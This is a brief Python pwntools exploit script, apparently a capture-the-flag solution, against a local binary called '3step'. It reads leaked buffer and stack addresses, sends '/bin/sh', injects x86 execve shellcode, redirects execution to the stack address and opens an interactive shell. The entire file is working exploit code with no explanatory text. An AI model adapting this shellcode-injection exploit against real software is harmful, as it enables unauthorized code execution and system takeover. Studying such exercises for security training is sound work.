from pwn import *

e = ELF('./3step')
p = process('./3step')

p.recvuntil('0x')
buf1 = int(p.recvline(),16)
stack = int(p.recvline(),16)

print p.recvuntil(': ')
p.sendline('/bin/sh\x00')
print p.recvuntil(': ')
shellcode = '''
		mov ebx, {}
		xor ecx, ecx
		xor edx, edx
		xor eax, eax
		mov al, 0xb
		int 0x80
	'''.format(buf1)

payload=asm(shellcode)
p.sendline(payload)
print p.recvuntil(': ')
p.sendline(p32(stack))
p.interactive()